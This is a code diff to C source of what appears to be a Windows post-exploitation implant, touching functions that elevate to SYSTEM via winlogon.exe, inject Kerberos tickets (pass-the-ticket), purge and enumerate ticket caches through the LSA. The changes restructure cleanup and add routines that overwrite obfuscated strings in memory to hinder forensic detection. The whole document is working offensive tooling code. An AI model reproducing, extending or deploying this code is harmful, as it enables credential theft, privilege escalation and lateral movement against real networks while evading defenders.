@@ -83,6 +83,7 @@ BOOL ElevateToSystem()
     winlogon[ 0 ]  = HideChar('w');
     winlogon[ 10 ] = HideChar('x');
     ProcessID = GetProcessIdByName(winlogon);
+    OverwriteStringW( winlogon );
     if (ProcessID == -1)
     {
         PUTS( "Failed to find the PID of Winlogon.exe" )
@@ -208,6 +209,7 @@ NTSTATUS GetLsaHandle( HANDLE hToken, BOOL highIntegrity, PHANDLE hLsa )
                 }
             }
         }
+        OverwriteStringA( name );
     }
     *hLsa = hLsaLocal;
     return status;
@@ -396,6 +398,7 @@ VOID CopyTicketInfo( PTICKET_INFORMATION TicketInfo, PKERB_TICKET_CACHE_INFO_EX 
 
 BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
 {
+    BOOL                     ReturnValue    = FALSE;
     BOOL                     highIntegrity  = FALSE;
     HANDLE                   hLsa           = NULL;
     LSA_STRING               krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
@@ -406,7 +409,7 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     DWORD                    submitSize     = sizeof( KERB_SUBMIT_TKT_REQUEST ) + TicketSize;
     PVOID                    response       = NULL;
     ULONG                    responseSize   = 0;
-    CHAR                     name[9]       = { 0 };
+    CHAR                     name[9]        = { 0 };
 
     name[ 5 ] = HideChar('r');
     name[ 0 ] = HideChar('k');
@@ -421,36 +424,32 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     krbAuth.Buffer = name;
 
     if ( ! hToken )
-        return FALSE;
+        goto END;
 
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
         PUTS( "[!] Not in high integrity." );
-        return FALSE;
+        goto END;
     }
 
     status = GetLsaHandle( hToken, highIntegrity, &hLsa );
     if ( ! NT_SUCCESS( status ) || ! hLsa )
     {
         PRINTF( "[!] GetLsaHandle %ld\n", status );
-        return FALSE;
+        goto END;
     }
 
     status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return FALSE;
+        goto END;
     }
 
     submitRequest = Instance.Win32.LocalAlloc( LPTR, submitSize * sizeof( KERB_SUBMIT_TKT_REQUEST ) );
     if ( ! submitRequest )
-    {
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return FALSE;
-    }
+        goto END;
 
     submitRequest->MessageType    = _KerbSubmitTicketMessage;
     submitRequest->KerbCredSize   = TicketSize;
@@ -468,27 +467,33 @@ BOOL Ptt( HANDLE hToken, PBYTE Ticket, DWORD TicketSize, LUID luid )
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
-        return FALSE;
+        goto END;
     }
 
     if ( ! NT_SUCCESS( protocolStatus ) )
     {
         PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
-        return FALSE;
+        goto END;
     }
 
-    Instance.Win32.LocalFree( submitRequest ); submitRequest = NULL;
-    Instance.Win32.LsaDeregisterLogonProcess( hLsa );
 
-    return TRUE;
+    ReturnValue = TRUE;
+
+END:
+    if ( submitRequest ) {
+        Instance.Win32.LocalFree( submitRequest );
+    }
+    if ( hLsa ) {
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+    }
+    OverwriteStringA( name );
+
+    return ReturnValue;
 }
 
 BOOL Purge( HANDLE hToken, LUID luid )
 {
+    BOOL                         ReturnValue    = FALSE;
     BOOL                         highIntegrity  = FALSE;
     HANDLE                       hLsa           = NULL;
     LSA_STRING                   krbAuth        = {.Buffer = NULL, .Length = 8, .MaximumLength = 9};
@@ -498,7 +503,7 @@ BOOL Purge( HANDLE hToken, LUID luid )
     ULONG                        authPackage    = 0;
     PVOID                        purgeResponse  = NULL;
     ULONG                        responseSize   = 0;
-    CHAR                         name[9]       = { 0 };
+    CHAR                         name[9]        = { 0 };
 
     name[ 5 ] = HideChar('r');
     name[ 0 ] = HideChar('k');
@@ -513,28 +518,27 @@ BOOL Purge( HANDLE hToken, LUID luid )
     krbAuth.Buffer = name;
 
     if ( ! hToken )
-        return FALSE;
+        goto END;
 
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
         PUTS( "[!] Not in high integrity." );
-        return FALSE;
+        goto END;
     }
 
     status = GetLsaHandle( hToken, highIntegrity, &hLsa );
     if ( ! NT_SUCCESS( status ) || ! hLsa )
     {
         PRINTF( "[!] GetLsaHandle %ld\n", status );
-        return FALSE;
+        goto END;
     }
 
     status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaLookupAuthenticationPackage %lx\n", status );
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return FALSE;
+        goto END;
     }
 
     //purgeRequest.MessageType = KerbPurgeTicketCacheMessage;
@@ -558,23 +562,29 @@ BOOL Purge( HANDLE hToken, LUID luid )
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", status )
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return FALSE;
+        goto END;
     }
 
     if ( ! NT_SUCCESS( protocolStatus ) )
     {
         PRINTF( "[!] LsaCallAuthenticationPackage: %lx\n", protocolStatus )
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return FALSE;
+        goto END;
     }
 
-    Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-    return TRUE;
+    ReturnValue = TRUE;
+
+END:
+    if (hLsa) {
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+    }
+    OverwriteStringA( name );
+
+    return ReturnValue;
 }
 
 PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
 {
+    BOOL                              ReturnValue    = FALSE;
     BOOL                              highIntegrity  = FALSE;
     HANDLE                            hLsa           = NULL;
     ULONG                             authPackage    = 0;
@@ -590,7 +600,7 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     PSESSION_INFORMATION              TmpSession     = NULL;
     PTICKET_INFORMATION               TicketInfo     = NULL;
     PTICKET_INFORMATION               TmpTicketInfo  = NULL;
-    CHAR                              name[9]       = { 0 };
+    CHAR                              name[9]        = { 0 };
 
     name[ 5 ] = HideChar('r');
     name[ 0 ] = HideChar('k');
@@ -605,36 +615,34 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
     krbAuth.Buffer = name;
 
     if ( ! hToken )
-        return NULL;
+        goto END;
 
     highIntegrity = IsHighIntegrity( hToken );
     if ( ! highIntegrity )
     {
         PUTS( "[!] Not in high integrity." );
-        return NULL;
+        goto END;
     }
 
     status = GetLsaHandle( hToken, highIntegrity, &hLsa );
     if ( ! NT_SUCCESS( status ) || ! hLsa )
     {
         PRINTF( "[!] GetLsaHandle %ld\n", status );
-        return NULL;
+        goto END;
     }
 
     status = Instance.Win32.LsaLookupAuthenticationPackage( hLsa, &krbAuth, &authPackage );
     if ( ! NT_SUCCESS( status ) )
     {
         PRINTF( "[!] LsaLookupAuthenticationPackage %ld\n", Instance.Win32.LsaNtStatusToWinError( status ) );
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return NULL;
+        goto END;
     }
 
     status = GetLogonSessionData( luid, &sessionData );
     if ( ! NT_SUCCESS( status ) || ! sessionData )
     {
         PRINTF( "[!] GetLogonSessionData: %lx", status );
-        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
-        return NULL;
+        goto END;
     }
 
     //cacheRequest.MessageType = KerbQueryTicketCacheExMessage;
@@ -720,11 +728,25 @@ PSESSION_INFORMATION Klist( HANDLE hToken, LUID luid )
         Instance.Win32.LsaFreeReturnBuffer( cacheResponse ); cacheResponse = NULL;
     }
 
-    Instance.Win32.LocalFree( sessionData->sessionData ); sessionData->sessionData = NULL;
-    Instance.Win32.LocalFree( sessionData ); sessionData = NULL;
-    Instance.Win32.LsaDeregisterLogonProcess( hLsa ); hLsa = NULL;
+    ReturnValue = TRUE;
 
-    return Sessions;
+END:
+    if ( sessionData && sessionData->sessionData ) {
+        Instance.Win32.LocalFree( sessionData->sessionData );
+    }
+    if ( sessionData ) {
+        Instance.Win32.LocalFree( sessionData );
+    }
+    if ( hLsa ) {
+        Instance.Win32.LsaDeregisterLogonProcess( hLsa );
+    }
+    OverwriteStringA( name );
+
+    if ( ReturnValue && Sessions ) {
+        return Sessions;
+    } else {
+        return NULL;
+    }
 }
 
 LUID* GetLUID( HANDLE hToken )
